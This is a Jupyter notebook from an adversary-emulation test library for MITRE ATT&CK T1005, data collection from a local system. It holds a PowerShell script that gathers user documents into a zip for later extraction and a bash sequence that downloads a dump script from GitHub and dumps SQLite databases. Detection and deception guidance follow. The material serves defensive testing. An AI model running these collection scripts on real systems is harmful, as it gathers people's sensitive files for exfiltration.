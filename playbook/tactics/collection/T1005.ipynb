{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "da787ac2",
   "metadata": {},
   "source": "# T1005 - Data from Local System\nAdversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n"
  },
  {
   "cell_type": "markdown",
   "id": "34a817c9",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "bbe2d20e",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Search files of interest and save them to a single zip file (Windows)",
    "This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              \n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$startingDirectory = \"C:\\Users\"\n$outputZip = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1005\"\n$fileExtensionsString = \".doc, .docx, .txt\" \n$fileExtensions = $fileExtensionsString -split \", \"\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null\n\nFunction Search-Files {\n  param (\n    [string]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  }\n  return $files\n}\n\n$foundFiles = Search-Files -directory $startingDirectory\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName\n  Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\"\n\n  Write-Host \"Zip file created: $outputZip\\data.zip\"\n  } else {\n      Write-Host \"No files found with the specified extensions.\"\n  }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "51cc5460",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1005 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "2b9f455a",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path  $outputZip\\data.zip -Force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b5fce9cc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1005 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "41a1521e",
   "metadata": {},
   "source": "### Atomic Test #2 - Find and dump sqlite databases (Linux)\nAn adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: Check if running on a Debian based machine.\n\n##### Check Prereq Commands:\n```bash\nif [ -x \"$(command -v sqlite3)\" ]; then echo \"sqlite3 is installed\"; else echo \"sqlite3 is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v strings)\" ]; then echo \"strings is installed\"; else echo \"strings is NOT installed\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```bash\nif grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi\nif grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "658a6128",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1005 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "56877846",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ncd $HOME\ncurl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art\ncurl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db\ncurl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh\nchmod +x sqlite_dump.sh\nfind . ! -executable -exec bash -c 'if [[ \"$(head -c 15 {} | strings)\" == \"SQLite format 3\" ]]; then echo \"{}\"; ./sqlite_dump.sh {}; fi' \\;\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "67253660",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1005 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "fd27bf4c",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nrm -f $HOME/.art\nrm -f $HOME/gta.db\nrm -f $HOME/sqlite_dump.sh \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "71caa7ef",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1005 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c5fb70bd",
   "metadata": {},
   "source": "## Detection\nMonitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to collect files such as configuration files with built-in features native to the network device platform.(Citation: Mandiant APT41 Global Intrusion )(Citation: US-CERT-TA18-106A) Monitor CLI activity for unexpected or unauthorized use commands being run by non-standard users from non-standard locations. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nFor network infrastructure devices, collect AAA logging to monitor `show` commands that view configuration files. "
  },
  {
   "cell_type": "markdown",
   "id": "7a908eea",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Pocket Litter \n Place data on a system to reinforce the legitimacy of the system or user. \n\n Pocket Litter is data placed on a system to convince an adversary that the system and users are real.  Pocket litter includes documents, registry entries, log history, browsing history, connection history, and other user data that one would expect to exist on a user's computer.  This content may overlap with Decoy Content, however Pocket Litter covers aspects beyond just content (e.g.: Installed Applications, source code, clutter on a system, etc.).\n#### Opportunity\nIn an adversary engagement scenario, there is an opportunity to add legitimacy by ensuring the local system is with fully populated with content.\n#### Use Case\nA defender can stage a variety of pocket litter files to bolster the legitimacy of the local system.\n#### Procedures\nWhen staging a decoy system and user account, populate a user's folders and web history to make it look realistic to an adversary.\nStage a USB device with documents on a specific topic in order to see if they are exfiltrated by an adversary.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}